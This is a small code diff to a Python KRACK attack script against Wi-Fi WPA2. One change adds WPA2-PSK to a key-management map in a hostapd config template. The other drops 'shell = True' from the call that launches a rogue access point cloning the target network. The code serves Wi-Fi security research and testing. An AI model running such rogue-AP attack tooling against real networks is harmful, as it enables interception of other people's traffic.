@@ -375,7 +375,7 @@ wmm_advertised={wmmadvertised}
 hw_mode=g
 auth_algs=3
 wpa_passphrase=abcdefgh"""
-		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
+		akm2str = {3: "WPA2-PSK" ,2: "WPA-PSK", 1: "WPA-EAP"}
 		ciphers2str = {2: "TKIP", 4: "CCMP"}
 		return TEMPLATE.format(
 			iface = iface,
@@ -930,7 +930,7 @@ class KRAckAttack():
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("../hostapd/hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["sudo", "../hostapd/hostapd", "hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell = True)
+		self.hostapd = subprocess.Popen(["sudo", "../hostapd/hostapd", "hostapd_rogue.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
